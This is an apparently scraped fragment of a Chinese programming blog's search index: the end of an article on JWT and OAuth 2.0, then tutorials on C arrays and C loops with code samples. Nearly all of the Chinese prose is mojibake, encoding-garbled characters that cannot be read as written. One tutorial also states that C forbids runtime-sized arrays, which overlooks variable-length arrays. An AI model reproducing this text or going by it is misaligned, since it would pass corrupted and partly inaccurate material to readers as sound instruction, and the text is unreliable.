é‡Œå­˜æ”¾ç”¨æˆ·ä¿¡æ¯ï¼Œç„¶åé€šè¿‡å®¢æˆ·ç«¯ Cookie ä¸­å­˜å‚¨çš„ session_id æ¥è·å–ç‰¹å®šçš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸ªè¿‡ç¨‹éœ€è¦æ¶ˆè€— Web æœåŠ¡å™¨çš„å†…å­˜å’Œå¯¹å®¢æˆ·ç«¯çš„è¦æ±‚æ¯”è¾ƒä¸¥æ ¼ï¼ˆå¿…é¡»æ”¯æŒ Cookieï¼‰ï¼Œè€Œ JWT æœ€å¤§çš„ç‰¹æ€§åœ¨äºå°±æ˜¯æ— çŠ¶æ€ã€å»ä¸­å¿ƒåŒ–ï¼Œæ‰€ä»¥ JWT æ›´é€‚ç”¨åˆ†å¸ƒå¼çš„åœºæ™¯ï¼Œä¸éœ€è¦åœ¨å¤šå°æœåŠ¡å™¨åšä¼šè¯åŒæ­¥è¿™ç§æ¶ˆè€—æœåŠ¡å™¨æ€§èƒ½çš„æ“ä½œã€‚å¦å¤– JWT å’Œ Redis + Token è¿™ä¸¤ç§ä¼šè¯ç®¡ç†æ–¹æ¡ˆéœ€è¦æ ¹æ®é¡¹ç›®æƒ…å†µé€‰æ‹©ï¼Œåˆ«ç”¨äº† JWT è¿˜ä½¿ç”¨ Redis å­˜å‚¨çš„ï¼Œå› ä¸ºè¿™ç§åšæ³•å¯¹ JWT æ¥è¯´å°±æ˜¯ â€œä¼¤å®³ä¸å¤§ï¼Œä½†ä¾®è¾±æ€§æå¼ºâ€ çš„åšæ³•ï¼Œç›¸å½“äºæ— è§† JWT çš„ â€œæ— çŠ¶æ€â€ ç‰¹æ€§ã€‚ JWT å­—ç¬¦ä¸²ç»“æ„JWT å­—ç¬¦ä¸²ç”± Headerï¼ˆå¤´éƒ¨ï¼‰ã€Payloadï¼ˆè´Ÿè½½ï¼‰ã€Signatureï¼ˆç­¾åï¼‰ä¸‰éƒ¨åˆ†ç»„æˆï¼š Header: JSON å¯¹è±¡ï¼Œç”¨æ¥æè¿° JWT çš„å…ƒæ•°æ®ï¼Œalg å±æ€§è¡¨ç¤ºç­¾åçš„ç®—æ³•ï¼Œtyp æ ‡è¯† token çš„ç±»å‹ Payload: JSON å¯¹è±¡ï¼Œé‡è¦éƒ¨åˆ†ï¼Œé™¤äº†é»˜è®¤çš„å­—æ®µï¼Œè¿˜å¯ä»¥æ‰©å±•è‡ªå®šä¹‰å­—æ®µï¼Œæ¯”å¦‚ç”¨æˆ· IDã€å§“åã€è§’è‰²ç­‰ç­‰ Signature: å¯¹ Headerã€Payload è¿™ä¸¤éƒ¨åˆ†è¿›è¡Œç­¾åï¼Œè®¤è¯æœåŠ¡å™¨ä½¿ç”¨ç§é’¥ç­¾åï¼Œç„¶ååœ¨èµ„æºæœåŠ¡å™¨ä½¿ç”¨å…¬é’¥éªŒç­¾ï¼Œé˜²æ­¢æ•°æ®è¢«äººåŠ¨äº†æ‰‹è„š JWT ç­¾åæœ‰å¯¹ç§°å’Œéå¯¹ç§°ä¸¤ç§æ–¹å¼ï¼š å¯¹ç§°æ–¹å¼ï¼šè®¤è¯æœåŠ¡å™¨å’Œèµ„æºæœåŠ¡å™¨ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥è¿›è¡ŒåŠ ç­¾å’ŒéªŒç­¾ ï¼Œé»˜è®¤ç®—æ³• HMAC éå¯¹ç§°æ–¹å¼ï¼šè®¤è¯æœåŠ¡å™¨ä½¿ç”¨ç§é’¥åŠ ç­¾ï¼Œèµ„æºæœåŠ¡å™¨ä½¿ç”¨å…¬é’¥éªŒç­¾ï¼Œé»˜è®¤ç®—æ³• RSA éå¯¹ç§°æ–¹å¼ç›¸è¾ƒäºå¯¹ç§°æ–¹å¼æ›´ä¸ºå®‰å…¨ï¼Œå› ä¸ºç§é’¥åªæœ‰è®¤è¯æœåŠ¡å™¨çŸ¥é“ JWT å¼€æºåº“çš„ä½¿ç”¨OAuth 2.0 ä¸ JWT çš„å…³ç³» OAuth 2.0 æ˜¯ä¸€ç§è®¤è¯æˆæƒçš„åè®®è§„èŒƒ JWT æ˜¯åŸºäº Token çš„å®‰å…¨è®¤è¯åè®®çš„å®ç° OAuth 2.0 çš„è®¤è¯æœåŠ¡å™¨ç­¾å‘çš„ Token å¯ä»¥ä½¿ç”¨ JWT æ¥å®ç°ï¼ŒJWT è½»é‡ä¸”å®‰å…¨ã€‚ Gateway + OAuth 2.0 + JWT å®ç°ç»Ÿä¸€çš„è®¤è¯æˆæƒ Gateway + Security + OAuth 2.0 + JWT å®ç°ç»Ÿä¸€çš„è®¤è¯æˆæƒ å‚è€ƒåšå®¢ nimbus-jose-jwt JWT åº“ä½¿ç”¨ä»‹ç» Spring Cloud Gateway + JWT å®ç°ç»Ÿä¸€çš„è®¤è¯æˆæƒ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"oauth"},{title:"C è¯­è¨€è¯­æ³•ä¹‹å››æ•°ç»„",url:"/posts/7f62c448.html",text:'æ•°ç»„çš„æ¦‚å¿µ åœ¨ç¨‹åºè®¾è®¡ä¸­ï¼Œä¸ºäº†å¤„ç†æ–¹ä¾¿æŠŠå…·æœ‰ç›¸åŒç±»å‹çš„è‹¥å¹²å˜é‡æŒ‰æœ‰åºçš„å½¢å¼ç»„ç»‡èµ·æ¥ï¼Œè¿™äº›æŒ‰åºæ’åˆ—çš„åŒç±»æ•°æ®å…ƒç´ çš„é›†åˆç§°ä¸ºæ•°ç»„ æ•°ç»„æ˜¯å…·æœ‰ç›¸åŒç±»å‹çš„æ•°æ®ç»„æˆçš„æœ‰åºé›†åˆï¼Œå…¶ä¸­çš„æ¯ä¸€ä¸ªæ•°æ®ç§°åŒ…å«æ•°ç»„å…ƒç´ ä¸æ•°ç»„ä¸‹æ ‡ï¼Œæ•°ç»„å…ƒç´ æ˜¯ç”±å…¶æ‰€åœ¨çš„ä½ç½®åºå·ï¼ˆç§°æ•°ç»„å…ƒç´ çš„ä¸‹æ ‡ï¼‰æ¥åŒºåˆ† åœ¨ C è¯­è¨€ä¸­æ•°ç»„å±äºæ„é€ æ•°æ®ç±»å‹ï¼Œä¸€ä¸ªæ•°ç»„å¯ä»¥åˆ†è§£ä¸ºå¤šä¸ªæ•°ç»„å…ƒç´ ï¼Œè¿™äº›æ•°ç»„å…ƒç´ å¯ä»¥æ˜¯åŸºæœ¬æ•°æ®ç±»å‹æˆ–æ˜¯æ„é€ ç±»å‹ã€‚å› æ­¤æŒ‰æ•°ç»„å…ƒç´ çš„ç±»å‹ä¸åŒï¼Œæ•°ç»„åˆå¯åˆ†ä¸ºæ•°å€¼æ•°ç»„ã€å­—ç¬¦æ•°ç»„ã€æŒ‡é’ˆæ•°ç»„ã€ç»“æ„æ•°ç»„ç­‰å„ç§ç±»åˆ« ä¸€ç»´æ•°ç»„çš„å®šä¹‰ ä¸€ç»´æ•°ç»„çš„å®šä¹‰æ–¹å¼ä¸ºï¼šç±»å‹è¯´æ˜ç¬¦ æ•°ç»„å [å¸¸é‡è¡¨è¾¾å¼]ï¼›ä¾‹å¦‚ï¼šint a[10]; è¡¨ç¤ºå®šä¹‰äº†ä¸€ä¸ªæ•´å‹æ•°ç»„ï¼Œæ•°ç»„åä¸º aï¼Œæ­¤æ•°ç»„æœ‰ 10 ä¸ªå…ƒç´ ï¼Œ10 ä¸ªå…ƒç´ éƒ½æ˜¯æ•´å‹å˜é‡ æ•°ç»„å…ƒç´ çš„ä¸€èˆ¬å¼•ç”¨å½¢å¼ä¸ºï¼šæ•°ç»„å [ä¸‹æ ‡]ï¼Œä¾‹å¦‚ï¼šint x = a[0] ä¸€ç»´æ•°ç»„åœ¨å†…å­˜ä¸­çš„å­˜æ”¾æ—¶ï¼Œæ¯ä¸ªæ•°æ®å…ƒç´ å ç”¨çš„å­—èŠ‚æ•°ï¼Œå°±æ˜¯åŸºæœ¬æ•°æ®ç±»å‹çš„å­—èŠ‚æ•°ï¼Œå…·ä½“å­˜æ”¾æ–¹å¼å¦‚ä¸‹ï¼š æ•°ç»„ä½¿ç”¨æ³¨æ„äº‹é¡¹ æ–¹æ‹¬å·ä¸­çš„å¸¸é‡è¡¨è¾¾å¼è¡¨ç¤ºæ•°æ®å…ƒç´ çš„ä¸ªæ•°ï¼Œä¹Ÿç§°ä¸ºæ•°ç»„çš„é•¿åº¦ æ•°ç»„åæ˜¯ç”¨æˆ·å®šä¹‰çš„æ•°ç»„æ ‡è¯†ç¬¦ï¼Œä¹¦å†™è§„åˆ™åº”ç¬¦åˆæ ‡è¯†ç¬¦çš„ä¹¦å†™è§„å®š å…è®¸åœ¨åŒä¸€ä¸ªç±»å‹è¯´æ˜ä¸­ï¼Œå®šä¹‰å¤šä¸ªæ•°ç»„å’Œå¤šä¸ªå˜é‡ï¼Œä¾‹å¦‚ï¼šint a,b,c,d,k1[10],k2[20]; ç±»å‹è¯´æ˜ç¬¦æ˜¯ä»»ä¸€ç§åŸºæœ¬æ•°æ®ç±»å‹æˆ–æ„é€ æ•°æ®ç±»å‹ï¼Œå¯¹äºåŒä¸€ä¸ªæ•°ç»„ï¼Œå…¶æ‰€æœ‰å…ƒç´ çš„æ•°æ®ç±»å‹éƒ½æ˜¯ç›¸åŒçš„ æ•°ç»„ a[10]ï¼Œè¡¨ç¤º a æ•°ç»„æœ‰ 10 ä¸ªå…ƒç´ ï¼Œä¸‹æ ‡æ˜¯ä» 0 å¼€å§‹çš„ï¼Œè¿™ 10 ä¸ªå…ƒç´ æ˜¯ a [0]ï¼Œa [1] â€¦ a [8]ï¼Œa [9]ï¼ŒæŒ‰ä¸Šé¢çš„å®šä¹‰ï¼Œä¸å­˜åœ¨æ•°ç»„å…ƒç´  a[10] C è¯­è¨€ä¸å…è®¸å¯¹æ•°ç»„çš„å¤§å°ä½œåŠ¨æ€å®šä¹‰ï¼Œå³æ•°ç»„çš„å¤§å°ä¸ä¾èµ–äºç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­å˜é‡çš„å€¼ï¼Œä»¥ä¸‹ä»£ç æ˜¯é”™è¯¯çš„ï¼š 1234567/********Cè¯­è¨€ä¸å…è®¸å¯¹æ•°ç»„çš„å¤§å°ä½œåŠ¨æ€å®šä¹‰ï¼Œä¸‹é¢çš„å†™æ³•æ˜¯é”™è¯¯çš„********/int main(){ int n; scanf("%d", &amp;n); int a[n]; return 0;} æ•°ç»„å…ƒç´ é€šå¸¸ä¹Ÿç§°ä¸ºä¸‹æ ‡å˜é‡ï¼Œå¿…é¡»å…ˆå®šä¹‰æ•°ç»„ï¼Œæ‰èƒ½ä½¿ç”¨ä¸‹æ ‡å˜é‡ï¼›åœ¨ C è¯­è¨€ä¸­åªèƒ½é€ä¸ªåœ°ä½¿ç”¨ä¸‹æ ‡å˜é‡ï¼Œè€Œä¸èƒ½ä¸€æ¬¡å¼•ç”¨æ•´ä¸ªæ•°ç»„ï¼Œä¾‹å¦‚ï¼š 12345678910/********è¾“å‡ºæœ‰10ä¸ªå…ƒç´ çš„æ•°ç»„æ—¶ï¼Œå¿…é¡»ä½¿ç”¨å¾ªç¯è¯­å¥é€ä¸ªè¾“å‡ºå„ä¸‹æ ‡å˜é‡********/int main(){ for(i=0; i&lt;10; i++) { printf("%d", a[i]); } return 0;}// ä¸èƒ½ç”¨ä¸€ä¸ªè¯­å¥è¾“å‡ºæ•´ä¸ªæ•°ç»„ï¼Œæ­¤å†™æ³•æ˜¯é”™è¯¯çš„ï¼šprintf("%d", a); å®šä¹‰æ•°ç»„æ—¶ç”¨åˆ°çš„æ•°ç»„å [å¸¸é‡è¡¨è¾¾å¼] å’Œå¼•ç”¨æ•°ç»„å…ƒç´ æ—¶ç”¨åˆ°çš„æ•°ç»„å[ä¸‹æ ‡] æ˜¯æœ‰åŒºåˆ«çš„ï¼Œä¾‹å¦‚ï¼šint a[10]; ä¸­çš„ 10 æ˜¯æŒ‡æ•°ç»„é•¿åº¦ï¼Œt=a[6]; æ˜¯æŒ‡å¼•ç”¨ a æ•°ç»„ä¸­åºå·ä¸º 6 çš„å…ƒç´ ï¼Œæ­¤æ—¶ 6 ä¸ä»£è¡¨æ•°ç»„é•¿åº¦ ä¸€ç»´æ•°ç»„çš„åˆå§‹åŒ–èµ‹å€¼ æ•°ç»„åˆå§‹åŒ–èµ‹å€¼æ˜¯æŒ‡åœ¨æ•°ç»„å®šä¹‰æ—¶ç»™æ•°ç»„å…ƒç´ èµ‹äºˆåˆå€¼ï¼Œæ•°ç»„åˆå§‹åŒ–çš„è¿‡ç¨‹æ˜¯åœ¨ç¼–è¯‘é˜¶æ®µè¿›è¡Œçš„ï¼Œè¿™æ ·å¯ä»¥å‡å°‘è¿è¡Œé—´ï¼Œæé«˜è¿è¡Œæ•ˆç‡ æ•°ç»„èµ‹å€¼çš„æ–¹æ³•é™¤äº†ç”¨èµ‹å€¼è¯­å¥å¯¹æ•°ç»„å…ƒç´ é€ä¸ªèµ‹å€¼å¤–ï¼Œè¿˜å¯é‡‡ç”¨åˆå§‹åŒ–èµ‹å€¼å’ŒåŠ¨æ€èµ‹å€¼çš„æ–¹æ³• æ•°ç»„åˆå§‹åŒ–èµ‹å€¼çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šç±»å‹è¯´æ˜ç¬¦ æ•°ç»„å[å¸¸é‡è¡¨è¾¾å¼]={å€¼, å€¼, â€¦â€¦å€¼};ï¼Œä¾‹å¦‚ï¼šint aï¼»10ï¼½= {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}; å¯ä»¥åªç»™ä¸€éƒ¨åˆ†æ•°ç»„å…ƒç´ èµ‹å€¼ï¼Œä¾‹å¦‚:int aï¼»10ï¼½= {0, 1, 2, 3, 4};ï¼Œè¡¨ç¤ºå®šä¹‰ a æ•°ç»„æœ‰ 10 ä¸ªå…ƒç´ ï¼Œä½†èŠ±æ‹¬å¼§å†…åªæä¾› 5 ä¸ªåˆå€¼ï¼Œè¿™ä»£è¡¨åªç»™å‰é¢ 5 ä¸ªå…ƒç´ èµ‹åˆå€¼ï¼Œå 5 ä¸ªå…ƒç´ å€¼é»˜è®¤ç¼ºçœä¸º 0 åœ¨å¯¹å…¨éƒ¨æ•°ç»„å…ƒç´ èµ‹åˆå€¼æ—¶ï¼Œç”±äºæ•°æ®çš„ä¸ªæ•°å·²ç»ç¡®å®šï¼Œå› æ­¤å¯ä»¥ä¸æŒ‡å®šæ•°ç»„é•¿åº¦ï¼Œä¾‹å¦‚ï¼šint aï¼»5ï¼½= {1, 2, 3, 4, 5}; å¯ä»¥å†™æˆï¼šint aï¼» ï¼½= {1, 2, 3, 4, 5}; æ•°ç»„åŠ¨æ€èµ‹å€¼çš„ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678910111213141516/********è¾“å…¥äº”ä¸ªæ•°ï¼Œæ±‚å‡ºæœ€å¤§çš„æ•°********/int main(){ int i, max=0, a[5]; printf("please input five number:\\n"); setbuf(stdin, NULL); for(i=0; i&lt;=4; i++){ scanf("%d", &amp;a[i]); } for(i=0; i&lt;=4; i++){ if(a[i] &gt; max){ max = a[i]; } } printf("max=%d\\n", max); return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"cè¯­è¨€"},{title:"C è¯­è¨€è¯­æ³•ä¹‹ä¸‰å¾ªç¯æ§åˆ¶ç»“æ„",url:"/posts/e2f81b63.html",text:'å¾ªç¯æ§åˆ¶ç»“æ„å¾ªç¯ç»“æ„å¾ªç¯ç»“æ„æ˜¯ç¨‹åºä¸­ä¸€ç§å¾ˆé‡è¦çš„ç»“æ„ã€‚å…¶ç‰¹ç‚¹æ˜¯ï¼Œåœ¨ç»™å®šæ¡ä»¶æˆç«‹æ—¶ï¼Œåå¤æ‰§è¡ŒæŸç¨‹åºæ®µï¼Œç›´åˆ°æ¡ä»¶ä¸æˆç«‹ä¸ºæ­¢ã€‚ç»™å®šçš„æ¡ä»¶ç§°ä¸ºå¾ªç¯æ¡ä»¶ï¼Œåå¤æ‰§è¡Œçš„ç¨‹åºæ®µç§°ä¸ºå¾ªç¯ä½“ã€‚C è¯­è¨€æä¾›äº†å¤šç§å¾ªç¯è¯­å¥ï¼Œå¯ä»¥ç»„æˆå„ç§ä¸åŒå½¢å¼çš„å¾ªç¯ç»“æ„ï¼Œåˆ†åˆ«æ˜¯ï¼š ç”¨ for è¯­å¥ ç”¨ while è¯­å¥ ç”¨ do-while è¯­å¥ ç”¨ goto è¯­å¥å’Œ if è¯­å¥æ„æˆå¾ªç¯ goto è¯­å¥ goto è¯­å¥æ˜¯ä¸€ç§æ— æ¡ä»¶è½¬ç§»è¯­å¥ï¼Œä¸ BASIC ä¸­çš„ goto è¯­å¥ç›¸ä¼¼ï¼Œgoto è¯­å¥çš„ä½¿ç”¨æ ¼å¼ä¸ºï¼šgoto è¯­å¥æ ‡å·; å…¶ä¸­æ ‡å·æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ ‡è¯†ç¬¦ï¼Œè¿™ä¸ªæ ‡è¯†ç¬¦åŠ ä¸Šä¸€ä¸ª : ä¸€èµ·å‡ºç°åœ¨å‡½æ•°å†…æŸå¤„ï¼Œæ‰§è¡Œ goto è¯­å¥åï¼Œç¨‹åºå°†è·³è½¬åˆ°è¯¥æ ‡å·å¤„å¹¶æ‰§è¡Œå…¶åçš„è¯­å¥ã€‚å¦å¤–æ ‡å·å¿…é¡»ä¸ goto è¯­å¥åŒå¤„äºä¸€ä¸ªå‡½æ•°ä¸­ï¼Œä½†å¯ä»¥ä¸åœ¨ä¸€ä¸ªå¾ªç¯å±‚ä¸­ã€‚é€šå¸¸ goto è¯­å¥ä¸ if æ¡ä»¶è¯­å¥è¿ç”¨ï¼Œå½“æ»¡è¶³æŸä¸€æ¡ä»¶æ—¶ï¼Œç¨‹åºè·³åˆ°æ ‡å·å¤„è¿è¡Œ å¿…é¡»æ³¨æ„ï¼Œgoto è¯­å¥é€šå¸¸ä¸å»ºè®®ä½¿ç”¨ï¼Œå› ä¸ºå®ƒå°†ä½¿ç¨‹åºå±‚æ¬¡ä¸æ¸…ï¼Œä¸”ä¸æ˜“è¯»ï¼Œä½†åœ¨å¤šå±‚åµŒå¥—é€€å‡ºæ—¶ï¼Œç”¨ goto è¯­å¥åˆ™æ¯”è¾ƒåˆç† 123456789101112/*******ä½¿ç”¨gotoè¯­å¥å’Œifè¯­å¥æ„æˆå¾ªç¯*******/int main(){ int i=1,sum=0; loop: if (i&lt;=100) { sum=sum+i; i++; goto loop; } printf("%d\\n",sum);} while è¯­å¥ while è¯­å¥çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šwhile (è¡¨è¾¾å¼) è¯­å¥ï¼Œå…¶ä¸­è¡¨è¾¾å¼æ˜¯å¾ªç¯æ¡ä»¶ï¼Œè¯­å¥ä¸ºå¾ªç¯ä½“ã€‚while è¯­å¥çš„è¯­ä¹‰æ˜¯ï¼šè®¡ç®—è¡¨è¾¾å¼çš„å€¼ï¼Œå½“å€¼ä¸ºçœŸï¼ˆé 0ï¼‰æ—¶ï¼Œåˆ™æ‰§è¡Œå¾ªç¯ä½“è¯­å¥ï¼Œå…¶æ‰§è¡Œè¿‡ç¨‹å¯ç”¨ä¸‹å›¾è¡¨ç¤ºï¼š while è¯­å¥ä¸­çš„è¡¨è¾¾å¼ä¸€èˆ¬æ˜¯å…³ç³»è¡¨è¾¾æˆ–é€»è¾‘è¡¨è¾¾å¼ï¼Œåªè¦è¡¨è¾¾å¼çš„å€¼ä¸ºçœŸ (é 0)ï¼Œå³å¯ç»§ç»­å¾ªç¯ å¾ªç¯ä½“å¦‚åŒ…æ‹¬æœ‰ä¸€ä¸ªä»¥ä¸Šçš„è¯­å¥ï¼Œåˆ™å¿…é¡»ç”¨ {} æ‹¬èµ·æ¥ï¼Œç»„æˆå¤åˆè¯­å¥ æ³¨æ„ï¼šå¦‚æœ while å¾ªç¯çš„è¡¨è¾¾å¼çš„å€¼ä¸€å¼€å§‹å°±ä¸º 0ï¼Œåˆ™å¾ªç¯è¯­å¥ä¸€æ¬¡ä¹Ÿä¼šè¢«ä¸æ‰§è¡Œ 1234567891011121314151617181920212223242526/*******ä½¿ç”¨whileè¯­å¥æ„æˆå¾ªç¯*******/int main(){ int i=1,sum=0; while(i&lt;=100) { sum=sum+i; i++; } printf("%d\\n",sum);}/*******ä¸‹é¢çš„whileå¾ªç¯æ°¸è¿œä¸ä¼šé€€å‡ºï¼ˆæ­»å¾ªç¯ï¼‰*******/int main(){ int i=1,sum=0; while(i&lt;=100) // ï½ sum=sum+i; i++; // } printf("%d\\n",sum);}// å› ä¸ºä¸Šé¢çš„whileå¾ªç¯ä½“æ²¡æœ‰ä½¿ç”¨{}æ‹¬èµ·æ¥ï¼Œi++ä¸å±äºwhileå¾ªç¯ä½“å†…çš„ä¸€éƒ¨åˆ†ï¼Œå¯¼è‡´äº†æ­»å¾ªç¯çš„å‘ç”Ÿ do-while è¯­å¥ do-while è¯­å¥çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šdo è¯­å¥ while(è¡¨è¾¾å¼);ï¼Œè¿™ä¸ªå¾ªç¯ä¸ while å¾ªç¯çš„ä¸åŒåœ¨äºï¼Œå®ƒå…ˆæ‰§è¡Œå¾ªç¯ä¸­çš„è¯­å¥ï¼Œç„¶åå†åˆ¤æ–­è¡¨è¾¾å¼æ˜¯å¦ä¸ºçœŸï¼Œå¦‚æœä¸ºçœŸåˆ™ç»§ç»­å¾ªç¯ï¼›å¦‚æœä¸ºå‡ï¼Œåˆ™ç»ˆæ­¢å¾ªç¯ã€‚å› æ­¤ï¼Œdo-while å¾ªç¯è‡³å°‘è¦æ‰§è¡Œä¸€æ¬¡å¾ªç¯è¯­å¥ 1234567891011/*******ä½¿ç”¨do-whileè¯­å¥æ„æˆå¾ªç¯*******/int main(){ int i=1,sum=0; do { sum=sum+i; i++; } while(i&lt;=100); printf("%d\\n", sum);} for è¯­å¥ åœ¨ C è¯­è¨€ä¸­ï¼Œfor è¯­å¥ä½¿ç”¨æœ€ä¸ºçµæ´»ï¼Œå®ƒå®Œå…¨å¯ä»¥å–ä»£ while è¯­å¥ï¼Œå®ƒçš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šfor (è¡¨è¾¾å¼ 1ï¼›è¡¨è¾¾å¼ 2ï¼›è¡¨è¾¾å¼ 3) è¯­å¥ for è¯­å¥çš„æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š 123451. å…ˆæ±‚è§£è¡¨è¾¾å¼12. æ±‚è§£è¡¨è¾¾å¼2ï¼Œè‹¥å…¶å€¼ä¸ºçœŸï¼ˆé0ï¼‰ï¼Œåˆ™æ‰§è¡Œforè¯­å¥ä¸­æŒ‡å®šçš„å†…åµŒè¯­å¥ï¼Œç„¶åæ‰§è¡Œä¸‹é¢ç¬¬3æ­¥ï¼›è‹¥å…¶å€¼ä¸ºå‡ï¼ˆ0ï¼‰ï¼Œåˆ™ç»“æŸå¾ªç¯ï¼Œè½¬åˆ°ç¬¬5æ­¥3. æ±‚è§£è¡¨è¾¾å¼34. è½¬å›ä¸Šé¢ç¬¬2æ­¥ç»§ç»­æ‰§è¡Œ5. å¾ªç¯ç»“æŸï¼Œæ‰§è¡Œforè¯­å¥ä¸‹é¢çš„ä¸€ä¸ªè¯­å¥ for è¯­å¥æœ€ç®€å•çš„åº”ç”¨å½¢å¼ä¹Ÿæ˜¯æœ€å®¹æ˜“ç†è§£çš„å½¢å¼æ˜¯ï¼šfor (å¾ªç¯å˜é‡èµ‹åˆå€¼ï¼›å¾ªç¯æ¡ä»¶ï¼›å¾ªç¯å˜é‡å¢é‡) è¯­å¥ï¼›å…¶ä¸­å¾ªç¯å˜é‡èµ‹åˆå€¼æ€»æ˜¯ä¸€ä¸ªèµ‹å€¼è¯­å¥ï¼Œå®ƒç”¨æ¥ç»™å¾ªç¯æ§åˆ¶å˜é‡èµ‹åˆå€¼ï¼›å¾ªç¯æ¡ä»¶æ˜¯ä¸€ä¸ªå…³ç³»è¡¨è¾¾å¼ï¼Œå®ƒå†³å®šä»€ä¹ˆæ—¶å€™é€€å‡ºå¾ªç¯ï¼›å¾ªç¯å˜é‡å¢é‡ï¼Œå®šä¹‰å¾ªç¯æ§åˆ¶å˜é‡æ¯å¾ªç¯ä¸€æ¬¡åæŒ‰ä»€ä¹ˆæ–¹å¼å˜åŒ–ã€‚è¿™ä¸‰ä¸ªéƒ¨åˆ†ä¹‹é—´ç”¨ ; åˆ†å¼€ï¼Œå…·ä½“ç¤ºä¾‹å¦‚ä¸‹ï¼š 1234for(i=1; i&lt;=100; i++){ sum=sum+i;} for è¯­å¥çš„ä½¿ç”¨æ³¨æ„äº‹é¡¹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253i. forå¾ªç¯ä¸­çš„â€œè¡¨è¾¾å¼1ï¼ˆå¾ªç¯å˜é‡èµ‹åˆå€¼ï¼‰â€ã€â€œè¡¨è¾¾å¼2(å¾ªç¯æ¡ä»¶)â€å’Œâ€œè¡¨è¾¾å¼3(å¾ªç¯å˜é‡å¢é‡)â€éƒ½æ˜¯å¯é€‰æ‹©é¡¹ï¼Œå³å¯ä»¥ç¼ºçœï¼Œä½†â€œï¼›â€ä¸èƒ½ç¼ºçœii. è‹¥ä¸‰ä¸ªè¡¨è¾¾å¼éƒ½çœç•¥äº†ï¼Œæ­¤æ—¶ for(;;) è¯­å¥ç›¸å½“äº while(1) è¯­å¥iii. çœç•¥äº†â€œè¡¨è¾¾å¼1ï¼ˆå¾ªç¯å˜é‡èµ‹åˆå€¼ï¼‰â€ï¼Œè¡¨ç¤ºä¸å¯¹å¾ªç¯æ§åˆ¶å˜é‡èµ‹åˆå€¼iiii. å¯çœç•¥â€œè¡¨è¾¾å¼1ï¼ˆå¾ªç¯å˜é‡èµ‹åˆå€¼ï¼‰â€å’Œâ€œè¡¨è¾¾å¼3(å¾ªç¯å˜é‡å¢é‡)â€ï¼Œä¾‹å¦‚ï¼šfor(;i&lt;=100;){ sum=sum+i; i++;}iiiii. çœç•¥äº†â€œè¡¨è¾¾å¼2(å¾ªç¯æ¡ä»¶)â€ï¼Œåˆ™ä¸åšå…¶å®ƒå¤„ç†æ—¶ä¾¿æˆä¸ºæ­»å¾ªç¯ï¼Œä¾‹å¦‚ï¼šfor(i=1;;i++){ sum=sum+i;}iiiiii. çœç•¥äº†â€œè¡¨è¾¾å¼3(å¾ªç¯å˜é‡å¢é‡)â€ï¼Œåˆ™ä¸å¯¹å¾ªç¯æ§åˆ¶å˜é‡è¿›è¡Œæ“ä½œï¼Œè¿™æ—¶å¯åœ¨å¾ªç¯ä½“ä¸­åŠ å…¥ä¿®æ”¹å¾ªç¯æ§åˆ¶å˜é‡çš„è¯­å¥ï¼Œä¾‹å¦‚ï¼šfor(i=1;i&lt;=100;){ sum=sum+i; i++;}iiiiiii. è¡¨è¾¾å¼1å¯ä»¥æ˜¯è®¾ç½®å¾ªç¯å˜é‡çš„åˆå€¼çš„èµ‹å€¼è¡¨è¾¾å¼ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ï¼šfor(sum=0;i&lt;=100;i++){ sum=sum+i;}iiiiiiii. è¡¨è¾¾å¼1å’Œè¡¨è¾¾å¼3å¯ä»¥æ˜¯ä¸€ä¸ªç®€å•è¡¨è¾¾å¼ä¹Ÿå¯ä»¥æ˜¯é€—å·è¡¨è¾¾å¼ï¼Œä¾‹å¦‚:for(sum=0,i=1;i&lt;=100;i++){{ sum=sum+i;}æˆ–è€…ï¼šfor(i=0,j=100;i&lt;=100;i++,j--){ k=i+j;}iiiiiiiii. è¡¨è¾¾å¼2ä¸€èˆ¬æ˜¯å…³ç³»è¡¨è¾¾å¼æˆ–é€»è¾‘è¡¨è¾¾å¼ï¼Œä½†ä¹Ÿå¯æ˜¯æ•°å€¼è¡¨è¾¾å¼æˆ–å­—ç¬¦è¡¨è¾¾å¼ï¼Œåªè¦å…¶å€¼éé›¶ï¼Œå°±ä¼šæ‰§è¡Œå¾ªç¯ä½“ï¼Œä¾‹å¦‚ï¼šfor(i=0;(c=getchar())!=\'\\n\';i+=c){ printf("%c",c);}æˆ–è€…ï¼šfor(;(c=getchar())!=\'\\n\';){ printf("%c",c);} å››ç§å¾ªç¯è¯­å¥çš„æ¯”è¾ƒ 